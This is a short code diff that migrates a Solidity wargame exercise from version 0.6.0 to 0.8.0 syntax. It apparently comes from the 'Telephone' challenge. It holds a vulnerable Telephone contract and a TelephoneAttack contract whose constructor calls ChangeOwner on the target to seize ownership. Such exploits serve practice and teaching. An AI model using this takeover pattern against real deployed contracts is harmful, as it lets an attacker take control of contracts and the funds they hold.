@@ -1,10 +1,10 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.6.0;
+pragma solidity ^0.8.0;
 
 contract Telephone {
     address public owner;
 
-    constructor() public {
+    constructor() {
         owner = msg.sender;
     }
 
@@ -15,9 +15,9 @@ contract Telephone {
     }
 }
 
-contract TelephoneAttack {
-    constructor(address _telephone, address _addr) public {
-        (bool result, bytes memory err) = address(_telephone).call.value(0)(
+contract TelephoneAttack {    
+    constructor(address _telephone, address _addr) {
+        (bool success, bytes memory err) = address(_telephone).call{value: 0}(
             abi.encodeWithSignature("ChangeOwner(address)", _addr)
         );
     }
